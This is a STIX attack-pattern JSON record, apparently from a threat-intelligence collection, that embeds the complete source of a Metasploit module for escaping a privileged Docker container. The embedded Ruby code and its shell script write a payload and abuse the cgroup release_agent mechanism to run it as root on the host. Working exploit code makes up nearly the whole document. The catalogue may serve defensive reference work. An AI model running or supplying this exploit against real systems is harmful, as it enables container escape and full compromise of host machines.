{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--356ab91d-f4a0-43af-85ea-d2d8a3de6004",
    "created": "2024-08-14T16:58:50.53412Z",
    "modified": "2024-08-14T16:58:50.534131Z",
    "name": "Docker Privileged Container Escape",
    "description": " This module escapes from a privileged Docker container and obtains root on the host machine by abusing the Linux cgroup notification on release feature. This exploit should work against any container started with the following flags: `--cap-add=SYS_ADMIN`, `--privileged`.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/docker_privileged_container_escape.rb",
            "external_id": "docker_privileged_container_escape.rb"
        },
        {
            "source_name": "reference",
            "url": "https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/stealthcopter/deepce"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n# POC modified from https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = NormalRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Post::File\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        {\n          'Name' => 'Docker Privileged Container Escape',\n          'Description' => %q{\n            This module escapes from a privileged Docker container and obtains root on the host machine by abusing the Linux cgroup notification on release\n            feature. This exploit should work against any container started with the following flags: `--cap-add=SYS_ADMIN`, `--privileged`.\n          },\n          'License' => MSF_LICENSE,\n          'Author' => ['stealthcopter'],\n          'Platform' => 'linux',\n          'Arch' => [ARCH_X86, ARCH_X64, ARCH_ARMLE, ARCH_MIPSLE, ARCH_MIPSBE],\n          'Targets' => [['Automatic', {}]],\n          'DefaultOptions' => { 'PrependFork' => true, 'WfsDelay' => 20 },\n          'SessionTypes' => ['shell', 'meterpreter'],\n          'DefaultTarget' => 0,\n          'References' => [\n            ['EDB', '47147'],\n            ['URL', 'https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/'],\n            ['URL', 'https://github.com/stealthcopter/deepce']\n          ],\n          'DisclosureDate' => '2019-07-17', # Felix Wilhelm @_fel1x first mentioned on twitter Felix Wilhelm\n          'Notes' => {\n            'Stability' => [ CRASH_SAFE ],\n            'Reliability' => [ REPEATABLE_SESSION ],\n            'SideEffects' => [ ARTIFACTS_ON_DISK, IOC_IN_LOGS ]\n          }\n        }\n      )\n    )\n    register_advanced_options(\n      [\n        OptBool.new('ForcePayloadSearch', [false, 'Search for payload on the file system rather than copying it from container', false]),\n        OptString.new('WritableContainerDir', [true, 'A directory where we can write files in the container', '/tmp']),\n        OptString.new('WritableHostDir', [true, 'A directory where we can write files inside on the host', '/tmp']),\n      ]\n    )\n  end\n\n  def base_dir_container\n    datastore['WritableContainerDir'].to_s\n  end\n\n  def base_dir_host\n    datastore['WritableHostDir'].to_s\n  end\n\n  # Get the container id and check it's the expected 64 char hex string, otherwise return nil\n  def container_id\n    id = cmd_exec('basename $(cat /proc/1/cpuset)').chomp\n    unless id.match(/\\A\\h{64}\\z/).nil?\n      id\n    end\n  end\n\n  # Check we have all the prerequisites to perform the escape\n  def check\n    # are in a docker container\n    unless file?('/.dockerenv')\n      return CheckCode::Safe('Not inside a Docker container')\n    end\n\n    # is root user\n    unless is_root?\n      return Exploit::CheckCode::Safe('Exploit requires root inside container')\n    end\n\n    # are rdma files present in /sys/\n    path = cmd_exec('ls -x /s*/fs/c*/*/r* | head -n1')\n    unless path.start_with? '/'\n      return Exploit::CheckCode::Safe('Required /sys/ files for exploitation not found, possibly old version of docker or not a privileged container.')\n    end\n\n    CheckCode::Appears('Inside Docker container and target appears vulnerable')\n  end\n\n  def exploit\n    unless writable? base_dir_container\n      fail_with Failure::BadConfig, \"#{base_dir_container} is not writable\"\n    end\n\n    pl = generate_payload_exe\n    exe_path = \"#{base_dir_container}/#{rand_text_alpha(6..11)}\"\n    print_status(\"Writing payload executable to '#{exe_path}'\")\n\n    upload_and_chmodx(exe_path, pl)\n    register_file_for_cleanup(exe_path)\n\n    print_status('Executing script to exploit privileged container')\n\n    script = shell_script(exe_path)\n\n    vprint_status(\"Script: #{script}\")\n    print_status(cmd_exec(script))\n\n    print_status \"Waiting #{datastore['WfsDelay']}s for payload\"\n  end\n\n  def shell_script(payload_path)\n    # The tricky bit is finding the payload on the host machine in order to execute it. The options here are\n    # 1. Find the file on the host operating system `find /var/lib/docker/overlay2/ -name 'JGsgvlU' -exec {} \\;`\n    # 2. Copy the payload out of the container and execute it `docker cp containerid:/tmp/JGsgvlU /tmp/JGsgvlU && /tmp/JGsgvlU`\n\n    id = container_id\n    filename = File.basename(payload_path)\n\n    vprint_status(\"container id #{id}\")\n\n    # If we cant find the id, or user requested it, search for the payload on the filesystem rather than copying it out of container\n    if id.nil? || datastore['ForcePayloadSearch']\n      # We couldn't find a container name, lets try and find the payload on the filesystem and then execute it\n      print_status('Searching for payload on host')\n      command = \"find /var/lib/docker/overlay2/ -name '#{filename}' -exec {} \\\\;\"\n    else\n      # We found a container id, copy the payload to host, then execute it\n      payload_path_host = \"#{base_dir_host}/#{filename}\"\n      print_status(\"Found container id #{container_id}, copying payload to host\")\n      command = \"docker cp #{id}:#{payload_path} #{payload_path_host}; #{payload_path_host}\"\n    end\n\n    vprint_status(command)\n\n    # the cow variables are random filenames to use for the exploit\n    c = rand_text_alpha(6..8)\n    o = rand_text_alpha(6..8)\n    w = rand_text_alpha(6..8)\n\n    %{\n      d=$(dirname \"$(ls -x /s*/fs/c*/*/r* | head -n1)\")\n      mkdir -p \"$d/#{w}\"\n      echo 1 >\"$d/#{w}/notify_on_release\"\n      t=\"$(sed -n 's/.*\\\\perdir=\\\\([^,]*\\\\).*/\\\\1/p' /etc/mtab)\"\n      touch /#{o}\n      echo \"$t/#{c}\" >\"$d/release_agent\"\n      printf \"#!/bin/sh\\\\n%s > %s/#{o}\" \"#{command}\" \"$t\">/#{c}\n      chmod +x /#{c}\n      sh -c \"echo 0 >$d/#{w}/cgroup.procs\"\n      sleep 1\n      cat /#{o}\n      rm /#{c} /#{o}\n    }.strip.split(\"\\n\").map(&:strip).join(';')\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-07-17, # Felix Wilhelm @_fel1x first mentioned on twitter Felix Wilhelm",
    "x_mitre_platforms": [
        "linux'"
    ]
}